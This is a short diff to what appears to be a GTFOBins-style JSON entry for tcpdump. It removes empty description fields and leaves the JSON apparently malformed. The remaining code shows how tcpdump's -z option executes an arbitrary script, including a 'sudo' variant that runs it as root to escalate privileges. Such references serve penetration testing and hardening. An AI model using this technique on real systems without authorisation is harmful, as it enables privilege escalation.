@@ -2,13 +2,13 @@
   "functions": {
     "command": [
       {
-        "description": "",
+        
         "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
       }
     ]
